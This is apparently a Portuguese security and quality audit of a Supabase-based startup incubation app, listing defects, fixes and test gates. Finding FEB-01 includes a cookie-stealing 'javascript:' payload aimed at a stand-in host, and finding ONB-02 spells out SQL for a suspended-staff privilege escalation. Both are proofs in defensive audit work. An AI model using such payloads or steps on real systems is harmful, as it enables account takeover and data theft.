# RC12 · Auditoria completa do ZIP `remix-of-startup-companion-main` (2 nov 2026)

**Veredicto.** A app está funcional e bem endurecida no essencial. Os fluxos centrais (lead no CRM, intake, contrato, assinatura, workspace e conta do founder) fecham de ponta a ponta nos três caminhos principais (assinatura nativa, DocuSign/PandaDoc e "Marcar como assinado" pelo backoffice). **Mas ainda não está pronta para operar sem supervisão.** Confirmei **236 defeitos** sobre a base viva (**4 HIGH, 94 MED, 138 LOW**), todos com prova, correção validada e verificação independente. Os 4 HIGH são: contas suspensas que mantêm poderes de staff, URLs `javascript:` em links que o staff clica, `publish_program_setup` que falha sempre com etapas, e o importador em massa de contratos que não importa nada. O maior risco estrutural não é um bug: **o repositório já não descreve a base real** (cerca de 19 migrações vivem só em `drizzle/migrations`).

### O que fazer, por ordem
1. **Hoje, sem alterar nada:** correr em produção o `LOVABLE-RC12-DRIFT-CHECKS.sql` (só leitura) e `LOVABLE-RC12-DADOS-AFETADOS.sql`. Dizem quantos registos reais já foram afetados.
2. **Aplicar as Partes 1 a 5 do pacote essencial** (`LOVABLE-RC12-FIXES-ESSENCIAL.md`): contêm todos os HIGH e o que eles precisam. Uma parte de cada vez, a seguir ao anexo i18n (`LOVABLE-RC12-I18N-PATCH.json`).
3. **Aplicar as Partes 6 a 15** quando houver tempo: são os MED (contratos, CRM, importações, automações, relatórios, pesquisa, backoffice). Cada parte deixa a app a compilar (provado, ver secção 3).
4. **Anexo R** (`LOVABLE-RC12-ANEXO-RECUPERACAO.md`) é opcional para a base viva, mas **se o aplicar, aplique-o antes da Parte 1**: repõe no repositório o DDL que só existe na base viva (no-op na base viva, com guardas) para o CI e qualquer ambiente novo nascerem iguais à produção. Aplicado depois de partes que redefinam as mesmas funções, os guardas abortam de propósito.
5. **Pacote opcional** (3 partes, defeitos LOW) e **Anexo T** (testes que falham antes e passam depois) só quando o resto estiver aplicado e verificado.

## 1. O achado estrutural: o repositório já não é a base

As lentes da primeira ronda correram numa réplica construída só com `supabase/migrations` e concluíram, por exemplo, que `staff_assign_or_create_workspace` rebentava e que a assinatura punha o intake em "activated" antes de existir workspace. **Ambos já estão corrigidos na base real**, porque `drizzle/migrations/0000-0018` (19 ficheiros no próprio repositório) foi aplicado pelo caminho de migração do Lovable e nunca foi copiado para `supabase/migrations`. Por isso refiz a réplica com esse DDL (equivalente à base viva), **revalidei todos os achados que tocam objetos de base de dados** e reescrevi o SQL a partir das definições finais. Resultado: **7 achados caíram, 10 mudaram de correção e 8 defeitos novos apareceram** (causados pelos triggers novos do drizzle, como `guard_contract_integrity`).

Consequências práticas, por ordem de importância:
- **Qualquer ambiente reconstruído do repositório** (`supabase start`, CI, staging) nasce com leituras abertas (`USING (true)` em 6 tabelas), sem os triggers de imutabilidade dos contratos assinados, sem `activation_sync_pending` e sem 7 funções. O CI não consegue verificar as proteções que a base real tem. As 5 suites `audit_*` só passam com os ficheiros drizzle injetados à mão.
- **Um `supabase db push` futuro pode desfazer segurança.** As migrações `rc11_part_a..d` existem nos dois caminhos; se a base só as registou no histórico drizzle, voltar a correr `rc11_part_b` depois da drizzle 0013 repõe a versão antiga de `account_not_suspended`. O Anexo R, por ser a migração mais recente, repõe a versão correta.
- **Ficheiros drizzle não são idempotentes** (substituições de texto em 0011, 0017 e 0018). Regra nova: nunca executar `drizzle/migrations` diretamente.
- **O baseline do repositório só reproduz em PostgreSQL 17** (`SET transaction_timeout` na primeira migração). Em PG16, 387 de 495 migrações falham. O harness foi corrigido (ver Parte 15, Opcional 3).
- Ficam objetos que só existem em produção e em nenhum ficheiro (`playbook_template_assignments`, `workspace_template_tasks`, `get_kpi_percentiles`, `workspace_readiness_status.status`): só se recuperam extraindo da produção. Está feito o gerador (`LOVABLE-RC12-DRIFT-CHECKS.sql`).

## 2. Âmbito e método

- **Fonte de verdade:** o ZIP mais recente exportado do Lovable (495 migrações em `supabase/`, 19 em `drizzle/`, 108 edge functions, cerca de 173 mil linhas de TypeScript em `src/`). O checkout git (parado em abril) não foi usado.
- **17 lentes em paralelo** (CRM, assinatura, onboarding, passagens entre fluxos, endurecimento das rondas anteriores, contrato código-esquema, 4 lotes de edge functions, 4 fatias de frontend, desempenho da base de dados, operação, desvio de migrações), cada uma com réplica PostgreSQL 16, PostgREST 12.2.3, Deno e fixtures por papel (admin, consultor, backoffice, founder, team_member, mentor, anónimo).
- **Contraprova independente** de cada achado HIGH/MED (um segundo auditor tenta refutar e reproduzir) e de lote para os LOW. Nenhum foi refutado, mas vários tiveram a correção reescrita ou a gravidade baixada.
- **Revalidação na réplica viva** (supabase + drizzle) de todos os achados que tocam objetos alterados pelo drizzle, com contra-verificador para tudo o que não ficou "confirmado tal como está".
- **Integração:** as correções, escritas em separado, foram aplicadas por domínios numa árvore comum, com revisor adversarial por domínio, e provadas em conjunto. O texto dos prompts é gerado a partir do `git diff` real dessa árvore, nunca à mão.

## 3. Gates: antes e depois

| Gate | ZIP original | Com as correções RC12 |
|---|---|---|
| `tsc --noEmit` | 0 erros | 0 erros |
| `eslint .` | 0 problemas | 0 problemas |
| `vitest` | 38 ficheiros, 257 testes | 67 ficheiros, 368 testes |
| `i18n:lint` | **falha: 8 chaves em falta** (`PendingApprovalsManager`) | 0 problemas |
| `i18n:check` (paridade pt/en) | passa | passa, 9379 chaves |
| `deno check` a todas as edge functions | 159 ficheiros, limpo | 167 ficheiros, limpo |
| `deno test _shared` | 149 passam, **3 falham** | 186 passam, 0 falham |
| `vite build` | passa | passa |
| Replay limpo de `supabase/migrations` em PG16 | **387 de 495 migrações falham** (`transaction_timeout`) | 0 migrações a falhar |
| pgTAP (harness do repositório) | 6 suites `audit_*` e 1 `crm_*` falham numa réplica limpa | 42 suites, 469 asserções, 0 falhas |
| Guard de segredos / scan de migrações | passam | passam |

**Sequência de partes:** provei que aplicar as 15 partes essenciais pela ordem deixa a app a compilar em cada fronteira (`tsc` e `deno check` por parte, sobre o ZIP original). Os ficheiros alterados por mais de uma correção foram combinados numa só edição (por exemplo `docusign-send-envelope`, `lifecycleSync`, `automation-engine`).

## 4. Validação dos fluxos pedidos

### CRM: captação, pipeline, intake e conversão

O fluxo de CRM está globalmente sólido para admin, consultor e backoffice. A cadeia de conversão e contrato (A5, A6, A7), a RLS por papel, o C9 do servidor e a paginação do CRM estão corretamente aplicados. O brief estava errado num ponto: o C9 do servidor ESTÁ aplicado em `public-contract-onboarding/index.ts` (linhas 584, 670-673 e 653-657). Encontrei 13 defeitos novos ou mal aplicados, sem nenhum HIGH. Os quatro mais relevantes são MED. O primeiro é a mudança de fase em massa para "Contratado", que cria leads contratadas sem startup nem workspace. O segundo é a marcação pública, que aceita qualquer data e hora e não reconfirma o calendário do consultor que fica com a reunião. O terceiro é uma falha parcial do calendário que o visitante vê como "Booking failed", e o reenvio dá falso sucesso. O quarto é uma lead manual com email em maiúsculas que fica duplicada quando a pessoa marca reunião. A importação CSV também falha em formato português (`;` e `5.000` lido como 5). Todas as correções foram validadas: tsc limpo, `deno check` limpo, SQL aplicado na réplica em ROLLBACK, e o parser CSV e a validação de horário testados à parte. O `staff_mark_funnel_item_contracted` não existe na réplica e continua por verificar.

| Passo | Estado | Prova (resumo) |
|---|---|---|
| 1. Captação: marcação pública (/book, get_slots/validate/upload_url,… | DEGRADED | Aplicados: B11 (round-robin só em pré-visualização, public-get-availability.ts 400-412; resolveFirstContactRoute com advanceRoundRobin=false), C10, D.0 slot_taken (testado: o 2.º email no mesmo slot dá `ERROR: slot_taken`).… |
| 2. Lead manual (NewLeadDialog / useCreateFunnelItem) | DEGRADED | A7 aplicado: o backoffice deixa de ser dono por omissão (NewLeadDialog.tsx:72). O email é gravado como escrito (NewLeadDialog.tsx:88): lead manual 'Joao.Silva@Startup.PT' + marcação pública do mesmo email dá 2 leads (SQL em… |
| 3. Importação CSV (bulk-import-leads, CsvLeadImport) | DEGRADED | B12 aplicado (linha repetida fica inválida com hash próprio, bulk-import-leads.ts 171-172). Mas o Excel PT exporta com ';' (cabeçalho lido como 1 coluna, pickColumn=-1, erro 'requires a name or email column') e '5.000' vira 5,… |
| 4. Importadores smart/HubSpot/PHC (prepare-*, commit-crm-import, commit-hubspot-import) | OK | Papéis coerentes: prepare-* admin+backoffice (prepare-hubspot-import:203, prepare-phc-import:48), commit-* só admin (commit-crm-import:146). RC11 C aplicado (type inválido, commit_import_funnel_item_v2). Notas em improvements… |
| 5. Pipeline: fase individual, arrastar, desfazer, em massa | DEGRADED | Individual e arrastar passam por useUpdateFunnelItem/isContractedTransition (useFunnel.ts:151-170), corretos. A mudança em massa (CrmBulkActions.tsx:133-136) oferece 'Contratado/Incubação/Aceleração' (STAGE_OPTIONS 78-82,… |
| 6. Ficha da lead: Contexto, timeline, notas, tarefas, Ecossistema | DEGRADED | B4/B6/B7/C11 aplicados (LinkedContextPanel.tsx:104/120 sem sector; EcosystemTable arquiva em vez de apagar; OverviewTab 838 com .select). RLS testada como backoffice: lê lead, cria nota e tarefa, atualiza tarefa, cria contrato e… |
| 7. Propostas (send-commercial-proposal) | OK | Auth requireCronOrStaff, idempotência por ledger, avança fase só de fases iniciais (linha 432). Único reparo LOW: recipients de email_log gravado como string JSON (linha 517). |
| 8. Intake: useCreateIntake, staff_rotate_intake_token, send-intake-email,… | DEGRADED | C8/C9 aplicados. Defeitos: assunto com escape HTML (send-intake-email:143), erros do servidor nunca chegam ao founder e 'link expirado' nunca é reconhecido (PublicContractIntake.tsx:158/177/249/281), lembrete de assinatura herda… |
| 9. Contrato a partir do CRM e conversão em workspace (RecordDrawer,… | OK | A5 (signature_provider='assinatura_digital' no cliente RecordDrawer.tsx:541 e no servidor public-contract-onboarding:296/330), A6 (a RPC reaproveita o contrato ligado à lead, convert.sql 62-70), A7 (send-workspace-invite:118-173… |
| 10. Negações por papel (founder, team_member, mentor, anónimo) | OK | SQL em t_bo_comm.sql e t_bo_consultors.sql: founder, team_member, mentor e anónimo veem 0 linhas em funnel_items, communication_log, contract_intakes e startup_contracts; backoffice não lê relationship_recaps (esperado: só staff). |

### Onboarding: registo, aprovação, claim, convites e founder

O onboarding está globalmente coerente depois do RC10 e do RC11: o registo cria perfil pendente com o papel certo, o claim automático (D.4) ativa o workspace sem onboarding, o assistente abre sozinho quando `needs_onboarding=true`, os convites têm interface e reenvio, e os itens A2, A7, A8, B2, B3, C4, C5 e C15 a C19 estão aplicados e fazem o que dizem (exceções abaixo). Encontrei porém duas falhas HIGH. A primeira é uma regressão do RC11 B4/B5: `staff_assign_or_create_workspace` em modo 'assign' e `staff_create_workspace_for_claim` rebentam sempre com "column reference workspace_id is ambiguous", por isso a equipa não consegue associar uma conta pendente a um workspace existente nem criar workspace para um claim. A segunda é que a suspensão continua a não retirar poderes: o RC11 B1 só corrigiu os helpers, e cerca de 144 políticas (79 com `has_role` direto, 65 com `user_roles` direto) mantêm o acesso. Demonstrei em SQL que um backoffice suspenso lê todos os workspaces, memberships e perfis, e que um consultor suspenso insere um convite, aceita-o com uma conta alias e fica founder ativo de qualquer workspace. Há ainda 5 achados MED (envio de convites sem verificar a conta, conta pendente ou suspensa a criar candidaturas e a atribuir-se o papel founder, `needs_onboarding` apagado pela atribuição, reconcile horário a ressuscitar contas suspensas, `claim_startup` que fica sem efeito ou só reclama um workspace) e 4 LOW. Todas as correções SQL vão numa migração nova e idempotente, 

| Passo | Estado | Prova (resumo) |
|---|---|---|
| 1. Registo anónimo (Login.tsx, check_signup_allowed, handle_new_user,… | OK | Réplica: insert em auth.users com selected_role founder, mentor_externo e admin cria perfil 'pending'; founder e mentor_externo recebem o papel, 'admin' é ignorado; startup_name é guardado com trim ('Acme'). check_signup_allowed… |
| 2. Aprovação de conta (PendingApprovalsManager, approve_user_account,… | OK | Réplica: backoffice aprova pendente (true); backoffice e consultor recebem 'Only admins can reactivate suspended accounts' ao reativar suspenso; admin reativa (true). reject_startup_claim e approve_user_account respondem como… |
| 3. Claim automático (claim_startup, ClaimStartup.tsx, banner) | DEGRADED | D.4 coerente: imported_unclaimed passa a 'active' com needs_onboarding=false, conta pendente fica aprovada, repetir devolve already_member. Mas com uma adesão antiga inativa devolve 'auto_claimed' sem ativar nada (ciclo no… |
| 4. Claim manual e atribuição de workspace (approve_startup_claim,… | BROKEN | staff_assign_or_create_workspace modo 'assign' e staff_create_workspace_for_claim falham sempre com 'column reference "workspace_id" is ambiguous' (t12_ambiguous.sql). Só 'create' do staff_assign e approve_startup_claim… |
| 5. Candidatura (CreateStartupDialog, create_startup_application) | DEGRADED | Funciona para contas aprovadas (workspace 'pending', founder ativo, needs_onboarding=true). Mas contas pendentes, suspensas e mentores aprovados também a executam e ficam com o papel founder (t1_application.sql). Ver ONB-4. |
| 6. Convites: envio (send-workspace-invite), aceitação (accept-workspace-invite,… | DEGRADED | Interface em WorkspaceDetail.tsx:443/700, reenvio atualiza o token, erros 403/400/404 distintos em AcceptInvite.tsx:62-72. Falhas: envio sem verificar conta ativa (ONB-3), aceitar com adesão inativa ou papel inferior não tem… |
| 7. Founder criado por contrato (founderAccount.ts, reconcile_contract_founders,… | DEGRADED | founderAccount.ts devolve account_suspended sem reativar, fecha a triagem e envia link token_hash validado por verifyOtp em ResetPassword.tsx:38-46. Mas o reconcile horário reatribui papel e adesão a contas suspensas ou… |
| 8. Máquina de estados (useFounderOnboardingState + ProtectedRoute em App.tsx) | OK | Sem ciclos: pendente de conta -> /pending-approval, suspenso -> /suspended, founder sem workspace -> /claim-startup (rotas isentas listadas em App.tsx:139-146), pending_workspace só abre /workspace/*, erro de leitura não… |
| 9. Assistente de onboarding (WorkspaceOnboardingWizard, complete_workspace_onboarding,… | DEGRADED | A8 aplicado: banner needs_onboarding (ClaimedWorkspaceBanner.tsx:30-51), abertura automática uma vez por sessão (WorkspaceDetail.tsx:104-120), conclusão com erro tratado e invalidação (Wizard:533-550). Mas… |
| 10. Mentor externo e NDA (MentorNda, accept-mentor-nda, useMentorNdaStatus) | OK | has_workspace_access exige has_accepted_nda para mentor_externo (rc11_part_b.sql:91-125); a página redireciona quem não é mentor ou já aceitou; erros de verificação bloqueiam em vez de abrir (App.tsx:122-130). |
| 11. Suspensão e reativação | BROKEN | is_staff/is_admin/is_backoffice já excluem suspensos, mas 79 políticas com has_role(auth.uid(),...) e 65 com user_roles direto não. Backoffice suspenso lê 2 workspaces, 3 memberships e 7 perfis; consultor suspenso cria convite e… |

### Assinatura de contratos e ciclo de vida

A assinatura nativa, a manual, o PandaDoc manual e a cadeia contrato assinado, workspace e conta do founder (A1, A2, A3, A5, A10, B1, B5, B10, C13, C14 do RC10) estão corretamente aplicados e passaram na réplica: o contrato do CRM sem workspace cria startup e workspace, liga o consultor da lead, abre a triagem «Convidar founder» e o link público deixa de servir depois de assinado ou terminado. O ponto fraco do RC11 é o que acontece quando o fornecedor externo falha ou demora. Um envio DocuSign ou PandaDoc recusado ou ambíguo (HTTP 202) aparece ao staff e ao founder como «enviado», deixa o contrato preso em «dispatching» ou «failed» e o intake em «signature_sent», sem botão de repetição. Um evento de webhook cujo handler cai a meio fica «received» no inbox e o retry do fornecedor é dado como duplicado, perdendo-se a assinatura. Três funções de envio (docusign-send-envelope, pandadoc-send-document, generate-contract-pdf) ignoram a verificação de conta ativa das rondas de segurança. «Repor e reenviar» deixa a aceitação do Regulamento da ronda anterior, o que reabre o salto do link para a assinatura (A3). Não encontrei defeitos HIGH. Todas as correções foram compiladas (deno check, tsc, deno test, vitest) ou aplicadas na réplica dentro de ROLLBACK.

| Passo | Estado | Prova (resumo) |
|---|---|---|
| 1. Criação do contrato e workspace (A1, A5, C13) | OK | SQL $SP/lens11/work/sign/s2.sql: contrato do CRM com intake e sem workspace, assinado pela rota nativa. ensure_contract_workspace devolveu workspace 'pending' com needs_onboarding=true, consultor da lead como… |
| 2. Rota nativa (assinatura_digital): link, dados, Regulamento, assinatura | DEGRADED | Guardas de estado corretas: public-contract-onboarding/index.ts:906-920 (404/410/409), digital_sign :1335-1345 e apply_contract_signature_atomic com grant (s1.sql: completed). Falhas: após «Repor e reenviar» o link salta para a… |
| 3. Rota manual e PandaDoc manual («Marcar como assinado») | OK | ContractDetailDrawer.tsx:1225-1230 mostra o botão para manual, pandadoc_manual enviado, pending_manual e native partially_signed. canonicalMarkAsSigned (contractLifecycleSync.ts:154-223) chama… |
| 4. Envio por API DocuSign/PandaDoc (staff_submit_signing e submit_signing público) | BROKEN | F1: resposta 202 'unknown' ou 4xx/5xx do fornecedor acaba em sucesso no cliente (IntakeReviewPanel.tsx:123-124,140; PublicContractSigning.tsx:489-495). s7.sql: contrato fica 'dispatching' sem envelope, isSent=t e canRetry=f, a… |
| 5. Webhooks DocuSign/PandaDoc (idempotência webhook_inbox, estados terminais) | DEGRADED | Guardas de estado terminal e de contrato fechado corretas (docusign-webhook:258-292, pandadoc-webhook:269-290). F2: handler que lança depois do claim deixa o inbox 'received' e o retry é dado como duplicado (s3.sql:… |
| 6. Pós-assinatura: conta do founder, ativação, intake e CRM | DEGRADED | syncIntakeOnCompleted (lifecycleSync.ts:102-296) ordena corretamente workspace, conta, membro e ativação, e devolve awaitingFounder sem falhar. founderAccount.ts usa fetch à Resend, sem SDK: A2 não regrediu. Falhas: email… |
| 7. Ciclo de vida: repor/reenviar, renovar, terminar, auto-renovar | DEGRADED | Renovar (RenewContractDialog.tsx:62-85) e terminar (useTerminateContract.ts:55-122, backoffice_archive_workspace devolve false com outro contrato em vigor) estão corretos; o cron de aniversários prolonga alocações… |
| 8. Arquivo SharePoint e recuperação de ativação | DEGRADED | archive-contracts-to-sharepoint: contratos 'uploading' nunca voltam à fila (index.ts:105, F11); o PDF arquivado como «signed» é o documento gerado antes da assinatura (ver improvements). reconcile-contract-activation/index.ts… |
| 9. Segurança das funções de contrato (contas suspensas) | DEGRADED | s5.sql: consultor suspenso mantém 1 linha em user_roles (é o que as funções verificam), is_account_active=f e is_staff()=f na BD. docusign-send-envelope:129, pandadoc-send-document:53 e generate-contract-pdf:627 não chamam… |

### Passagens entre fluxos: lead até founder com onboarding

A cadeia lead, intake, contrato, assinatura, workspace e founder fecha de ponta a ponta nos três caminhos principais. Reproduzi na réplica a rota nativa a partir de uma lead nova, a lead convertida pelo consultor antes do contrato e a lead do backoffice com "Marcar como assinado". Também fecham a recusa e "Repor e reenviar", o founder pendente ou suspenso e a repetição da assinatura pelo link. Os 4 HIGH do RC10 estão resolvidos nestes cenários. O que não fecha são as passagens quando um passo falha a meio, e a recuperação (reconcile-contract-activation) não é equivalente à rota feliz. Em síntese: - (1) Um workspace arquivado nunca é reativado pelas rotas automáticas, ao contrário da rota manual do RC11 B8; fica contrato ativo, alertas repetidos e o founder redirecionado para /claim-startup. - (2) Um trigger de base de dados põe o intake em 'activated' no instante da assinatura, antes de haver workspace ou conta; é um desvio ao invariante de AGENTS.md, que diz que o intake só ativa depois de verificar o workspace. - (3) A recuperação dá-se por concluída sem criar a conta do founder quando o workspace já está ativo. - (4) A lead assinada fica com type='lead' e cai nos baldes comerciais parados da Inbox. - (5) Uma startup já importada, com o mesmo NIF, é duplicada. Os restantes são LOW. As correções estão validadas em migrações RC12 (idempotentes, aplicadas duas vezes), num diff das edge functions (deno check e 13 testes) e nos mesmos cenários re-corridos. Os pgTAP que correm na

| Passo | Estado | Prova (resumo) |
|---|---|---|
| A. Lead nova (consultor) -> intake -> submissão -> aprovação (backoffice) -> contrato… | OK | scenA.sql: ensure_contract_workspace cria startup e workspace 'pending'; autoCreateFounderAccount cria a conta e o membro founder; o workspace fica 'active' com needs_onboarding=t; a triagem 'missing_auth_user' fecha-se e sai o… |
| B. Lead convertida pelo consultor antes do contrato + rota nativa | DEGRADED | scenB.sql: a cadeia fecha, mas syncIntakeOnCompleted (lifecycleSync.ts:232) rebaixa a lead de 'incubating' para 'contracted' (ver achado de regressão de fase). |
| C. Lead do backoffice sem consultor: converter e depois 'Marcar como assinado' | OK | scenC.sql: o workspace nasce 'pending' sem membros; staff-assign cria a conta; activate_workspace_for_signed_contract devolve 'unchanged' porque o trigger já ativou (estado 'claimed'). Final: ws active e founder ligado. A RPC… |
| D. Paridade pós-assinatura entre rota manual, PandaDoc, DocuSign e nativa | DEGRADED | scenD_archived.sql: a rota manual reativa um workspace arquivado (B8); as rotas automáticas dão 'workspace_activate: not_active' e repetem o alerta em cada corrida. Os webhooks usam contract.workspace_id (null no fluxo de… |
| E. Recusa/anulação/terminação e 'Repor e reenviar' | OK | scenE.sql: a recusa põe o intake em 'cancelled' e a lead em 'rejected'; 'Repor' devolve a lead a approved_for_signature; o reenvio reabre o intake para signature_sent (via trigger). Os lembretes só correm em intake_requested,… |
| F. Founder já registado (conta pendente) e founder suspenso como representante | OK | scenF.sql: a conta pendente passa a approved e recebe o email 'contrato ativo' (sem link de recuperação). A conta suspensa não é reativada e abre a triagem 'account_suspended'; depois de o admin reativar, o cron horário… |
| G. Idempotência (assinatura repetida, link reutilizado, webhook repetido) | DEGRADED | scenG.sql: o mesmo comando devolve idempotent:true com 1 evento. O link fecha-se pelo guarda signingClosed (index.ts:1065-1073) e pelo token a null. Os webhooks usam o guarda de estado terminal. Falha:… |
| Recuperação de ativação RC11 (activation_sync_pending, reconcile-contract-activation):… | DEGRADED | Fecha: lead sem programa (P1/P2: ao indicar o programa a corrida seguinte cria workspace, conta e ativa), workspace sem membros e sem email (Await2), conta criada com email falhado (triagem access_email_failed). Não fecha:… |

> Nota de leitura: os estados acima são os da lente. Depois da revalidação na base viva caíram E2E-02, SIGN-05, OPS-03 e E2E-12, e o ONB-01 ficou reduzido ao botão "Criar workspace" do claim; os passos afetados estão a verde na base real.

## 5. Os 4 HIGH

### DBP-01 · publish_program_setup falha com 42P10 sempre que o rascunho tem etapas (stages)
**Onde:** `supabase/migrations/20260721070802_9798d307-2062-4f51-9989-d6916d16604a.sql:168`, `supabase/migrations/20260102023801_7337f657-2be0-422a-80f6-04c6d429320f.sql:10-11`. **Quem:** admin, consultor. **Parte:** P1.

Ao publicar a configuração de um programa de incubação (o caminho ELSE da função) que inclua etapas, o INSERT ... ON CONFLICT (program_id, stage_key) falha com 'there is no unique or exclusion constraint matching the ON CONFLICT specification', porque o único índice único sobre essas colunas é parcial (WHERE stage_key IS NOT NULL) e o ON CONFLICT não traz predicado. Admin/consultor não conseguem concluir a publicação de nenhum programa clonado ou com etapas (o wizard carrega as etapas existentes ao clonar); o rascunho fica com last_publish_error. Só publica quem não tiver etapas. O teste program_publish_atomic passa porque nunca inclui etapas.

**Prova:** Réplica: `select publish_program_setup(draft, program, '{"basics":{"program_type":"incubation","name":"P"},"stages":[{"stage_key":"ideation","name":"Ideia","position":1,"is_active":true}]}'::jsonb,'{}')` como service_role => `ERROR: there is no unique or exclusion constraint matching the ON CONFLICT specification ... PL/pgSQL function publish_program_setup(uuid,uuid,jsonb,jsonb) line 150`. O mesmo draft sem etapas devolve success=true. `\d stages`: só `stages_program_stage_key_unique ... WHERE (stage_key IS NOT NULL)` e `stages_program_id_name_key (program_id,name)`. Depois de M4: success=true e 1 linha em stages. Varrimento de todos os ON CONFLICT das funções SQL (36 ocorrências): este é o único outro a falhar além dos de notifications. Reproduzido também na réplica viva (supabase + drizzle).

### ED3-01 · bulk-import-commit: o gate commit_authorized nunca é ativado, o assistente não importa nada e queima as linhas para 'error'
**Onde:** `supabase/functions/bulk-import-commit/index.ts:72`, `src/pages/BulkContractImport.tsx:274-296`. **Quem:** admin. **Parte:** P5.

O administrador carrega PDFs, revê e clica em 'Importar'. A edge function recusa cada linha com 'commit_authorized=false — row not approved for commit', porque a coluna tem DEFAULT false e nenhum ecrã ou função a coloca a true para linhas do assistente (só os RPCs do funil CRM o fazem). O toast mostra 'Imported 0 contracts (N failed)'. Pior: o catch (366) passa todas as linhas a status 'error', e o ecrã só lista will_create/will_update (BulkContractImport.tsx:277), logo não há como repetir sem recarregar os PDFs. Foi uma ronda de endurecimento que acrescentou o gate sem o contraparte na UI.

**Prova:** SQL na réplica: INSERT em bulk_import_rows sem commit_authorized -> 'will_create / f' ($W/claim.sql). grep -rn commit_authorized em src/ e supabase/: só ReconcilerCanaryPanel (outro fluxo, commit_authorized_ids), reconciler-run e 3 migrações de RPC do funil (UPDATE ... commit_authorized = true para p_row_id de funil); nem BulkContractImport.tsx nem bulk-import-extract tocam na coluna. A UI invoca 'bulk-import-commit' com { batch_id } (292-294), logo require_authorization fica ON (72). Código: 135-136 lança; 364-369 grava status 'error'.

### FEB-01 · XSS por clique: profiles.linkedin_url de um mentor é renderizado como href sem sanitizar no separador Mentores do admin
**Onde:** `src/components/admin/AdminExternalMentorsManager.tsx:388-396`, `src/components/admin/AdminProgramsManager.tsx:307` (+5). **Quem:** admin (vítima); mentor_externo (atacante); também consultor/founder nos locais de outras fatias. **Parte:** P1, P3, P4, P5, O1.

A política 'Profile owners can update' deixa qualquer utilizador (incluindo um mentor externo) gravar o que quiser em profiles.linkedin_url e não há CHECK na base. O separador Mentores (admin) lê esse valor de profiles_safe e faz <a href={mentor.linkedin_url}>. Um valor 'javascript:...' é renderizado como link; ao clicar no ícone do LinkedIn, o código corre na origem da app com a sessão do admin (token Supabase), o que dá tomada de conta de admin a partir de uma conta de baixo privilégio. Os restantes componentes da app já usam sanitizeUrl/safeExternalHref; estes ficaram de fora.

**Prova:** SQL na réplica (t5_linkedin.sql): como MENTOR, UPDATE profiles SET linkedin_url='javascript:fetch("//evil.example/?c="+document.cookie)' devolve 1 linha; como ADMIN, SELECT linkedin_url FROM profiles_safe devolve o mesmo valor; só existe 1 CHECK em profiles e nenhum cobre a coluna. Teste vitest src/test/zz_mentor_link.test.tsx: no original falha ('expected true to be false', existe <a href="javascript:...">); na versão corrigida passa. grep global de href={...url...} sem safeExternalHref lista os 9 sítios acima.

### ONB-02 · Contas suspensas mantêm poderes de staff em cerca de 144 políticas e podem convidar um alias como founder de qualquer workspace
**Onde:** `supabase/migrations/20261019110000_rc11_part_b.sql:4-185`, `supabase/migrations/20261019100000_rc11_part_a.sql:343` (+2). **Quem:** backoffice, consultor e admin suspensos (staff afastado); qualquer workspace. **Parte:** P1.

O RC11 B1 tornou is_staff, is_admin, is_backoffice, can_access_backoffice e is_account_active cientes da suspensão, mas não tocou em `has_role(auth.uid(),'admin'|'consultor'|'backoffice')` (79 políticas) nem nas políticas que leem `user_roles` diretamente (65). Os papéis sobrevivem à suspensão (a sessão e o refresh token também). Consequências demonstradas: (a) um backoffice suspenso continua a ler todos os workspaces, memberships e perfis (dados pessoais de todos); (b) um consultor ou admin suspenso continua a poder fazer INSERT em `workspace_invitations` com um token_hash à sua escolha, para qualquer workspace e qualquer email; uma conta alias aceita o convite por `accept_workspace_invitation` e passa a founder ativo, ou seja, acesso persistente aos dados do workspace depois de o staff ter sido afastado.

**Prova:** Réplica, personas do fixture (t5_suspended_staff.sql, t9_susp_invite.sql). Backoffice ativo: workspaces=2, workspace_users=3, profiles=7; depois de `UPDATE profiles SET account_status='suspended'`: workspaces=2, workspace_users=3, profiles=7 (igual). Consultor suspenso: `is_staff()`=false, mas `INSERT INTO workspace_invitations(workspace_id,email,role,token_hash,created_by) VALUES (<WS_B>,'alias@fx.test','founder','deadbeef',<cons>)` é aceite; como alias `accept_workspace_invitation('deadbeef')` devolve success e `workspace_users` fica com role=founder, active=true em WS_B. Contagem de políticas: 79 com has_role cru e 65 com user_roles cru sem account_not_suspended. Com a correção: backoffice suspenso 0/0/1 (só o próprio perfil), INSERT recusado com `new row violates row-level security policy "rc12_suspended_block"`, utilizadores ativos inalterados (consultor 2 workspaces, founder 1). Reproduzido também na réplica viva (supabase + drizzle).

Auditados como HIGH e baixados pelos verificadores: ONB-01 (MED: Atribuir workspace a conta pendente ('Associar') e criar workspace para um claim…); HRD-01 (MED: Timeout global de 30 s no cliente corta uploads, IA e importações enquanto o servidor…); DRF-01 (MED: A segurança e os guardas da base viva existem só em drizzle/migrations: um ambiente…).

## 6. Defeitos MED (94)

| ID | Defeito | Onde | Quem | Parte |
|---|---|---|---|---|
| CRM-01 | Mudança de fase em massa para 'Contratado' cria leads contratadas sem startup, workspace nem contrato | `src/components/crm/CrmBulkActions.tsx:78-82` | admin, consultor, backoffice (CRM em massa) | P14 |
| CRM-02 | Marcação pública aceita qualquer data/hora e não reconfirma o calendário do consultor que fica com a reunião | `supabase/functions/public-book-first-contact/index.ts:55-69`, `supabase/functions/_shared/first-contact-routing.ts:107-111` | anónimo (link público), consultor | P8 |
| CRM-03 | Falha parcial do calendário aparece ao visitante como 'Booking failed', e o reenvio dá falso sucesso sem convite | `src/pages/PublicBooking.tsx:189`, `supabase/functions/public-book-first-contact/index.ts:531-548` | anónimo (visitante), consultor | P8 |
| CRM-04 | Lead manual com email em maiúsculas fica duplicada quando a pessoa marca reunião pública | `src/components/crm/NewLeadDialog.tsx:88`, `supabase/functions/public-book-first-contact/index.ts:485` | admin, consultor, backoffice, anónimo | P8 |
| CRM-07 | Importação CSV falha com ficheiros do Excel em português e lê '5.000' como 5 | `supabase/functions/bulk-import-leads/index.ts:34-57`, `src/components/crm/CsvLeadImport.tsx:45` | admin, consultor | P9 |
| DBP-02 | Todos os upserts de notifications com onConflict user_id,event_key falham em silêncio (42P10) | `supabase/migrations/20260531194512_44d3a75b-df43-4c51-bace-1948f2288675.sql:2-4`, `src/hooks/useSessions.ts:110` (+5) | founder, team_member, consultor, admin, backoffice | P1, P6, P12 |
| DBP-05 | Faltam 32 índices de FK em tabelas quentes (inclui workspace_id de milestones, sessions, documents e user_id de workspace_users) | supabase/migrations (nenhuma migração cria idx_milestones_workspace,… | todos | P6 |
